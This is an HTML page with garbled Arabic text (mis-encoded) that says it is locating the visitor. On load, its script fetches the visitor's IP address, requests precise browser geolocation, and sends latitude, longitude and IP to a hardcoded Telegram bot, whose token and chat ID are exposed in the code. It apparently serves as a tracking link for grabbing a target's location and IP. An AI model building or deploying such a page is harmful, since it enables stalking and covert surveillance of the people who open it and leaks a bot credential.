<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ùˆ IP</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; }
    #status { font-size: 18px; margin-top: 20px; white-space: pre-line; }
  </style>
</head>
<body>
  <h2>Ø¬Ø§Ø±Ù ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹Ùƒ Ùˆ Ø¹Ù†ÙˆØ§Ù† IP...</h2>
  <div id="status">Ø§Ù†ØªØ¸Ø± Ù‚Ù„ÙŠÙ„Ø§Ù‹...</div>

  <script>
    const botToken = "7479937324:AAF2xQMakcnYT2z_hjuhbL_M8muZOg-dI0s";
    const chatId = "7188733937";

    let ipAddress = "";
    let locationData = null;

    // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø¸Ø§Ù‡Ø±Ø©
    function updateStatus(msg) {
      document.getElementById("status").innerText = msg;
    }

    // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
    function sendToTelegram() {
      if (!ipAddress || !locationData) {
        updateStatus("âŒ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ØºÙŠØ± Ù…ÙƒØªÙ…Ù„Ø©ØŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¥Ø±Ø³Ø§Ù„.");
        return;
      }

      const lat = locationData.coords.latitude.toFixed(6);
      const lon = locationData.coords.longitude.toFixed(6);

      const message =
        `ğŸ“ ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø¬Ø¯ÙŠØ¯:\n\n` +
        `ğŸŒ Ø®Ø· Ø§Ù„Ø¹Ø±Ø¶: ${lat}\n` +
        `ğŸ§­ Ø®Ø· Ø§Ù„Ø·ÙˆÙ„: ${lon}\n` +
        `ğŸ’» Ø¹Ù†ÙˆØ§Ù† IP: ${ipAddress}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      fetch(url)
        .then(res => res.json())
        .then(data => {
          if (data.ok) {
            updateStatus(`âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù†Ø¬Ø§Ø­:\n\n${message}`);
          } else {
            updateStatus("âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù….");
            console.error("Telegram Error:", data);
          }
        })
        .catch(err => {
          updateStatus("âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨ØªÙ„ÙŠØ¬Ø±Ø§Ù….");
          console.error("Fetch Error:", err);
        });
    }

    // Ø·Ù„Ø¨ IP Ø£ÙˆÙ„Ø§Ù‹
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        ipAddress = data.ip;
        console.log("IP Address:", ipAddress);
        requestLocation();  // Ø¨Ø¹Ø¯ Ø¬Ù„Ø¨ IP Ù†Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
      })
      .catch(err => {
        ipAddress = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        console.error("IP Fetch Error:", err);
        requestLocation();
      });

    // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            locationData = position;
            sendToTelegram();
          },
          error => {
            updateStatus("âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
            console.error("Location Error:", error);
          }
        );
      } else {
        updateStatus("âŒ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹.");
      }
    }
  </script>
</body>
</html>
